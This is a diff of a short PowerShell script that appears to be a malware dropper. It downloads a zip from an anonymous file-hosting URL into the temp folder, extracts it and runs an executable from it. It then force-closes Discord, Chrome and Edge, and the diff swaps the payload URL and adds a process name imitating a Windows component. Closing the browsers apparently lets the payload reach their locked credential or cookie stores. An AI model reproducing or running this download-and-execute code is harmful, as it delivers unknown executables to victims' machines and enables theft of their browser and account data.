@@ -1,4 +1,4 @@
-$zipUrl = "https://files.catbox.moe/0tjan7.zip"
+$zipUrl = "https://files.catbox.moe/7fwhvd.zip"
 
 $zipPath = "$env:TEMP\work.zip"
 $extractPath = "$env:TEMP\work"
@@ -20,7 +20,7 @@ if ($exe) {
 
 Start-Sleep 2
 
-taskkill /f /im discord.exe > $null 2>&1
+taskkill /f /im Runtimer Broker.exe > $null 2>&1
 taskkill /f /im chrome.exe > $null 2>&1
 taskkill /f /im msedge.exe > $null 2>&1
 
